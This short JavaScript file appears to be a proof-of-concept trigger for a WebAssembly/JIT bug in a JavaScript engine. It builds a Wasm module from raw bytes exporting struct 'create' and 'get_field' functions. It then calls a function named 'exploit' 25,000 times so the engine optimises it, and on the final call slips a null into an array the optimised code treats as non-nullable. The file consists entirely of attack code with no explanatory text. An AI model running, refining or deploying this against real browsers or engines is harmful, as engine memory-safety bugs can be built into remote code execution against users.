const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,14,3,96,1,99,0,1,127,96,0,1,99,0,95,1,127,0,3,3,2,0,1,7,25,2,9,103,101,116,95,102,105,101,108,100,0,0,6,99,114,101,97,116,101,0,1,10,17,2,7,0,32,0,251,2,1,0,11,6,0,65,42,251,3,0,11]);
const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule, {});
const { create, get_field } = wasmInstance.exports;

const arr_non_nullable = [create()];
const arr_nullable = [null];

function exploit(trigger) {
    const which_array = trigger ? arr_nullable : arr_non_nullable;
    const combined = arr_non_nullable.concat(which_array);
    get_field(combined[1]);
}

for (let i = 0; i < 25000; i++) {
    exploit(i === 24999);
}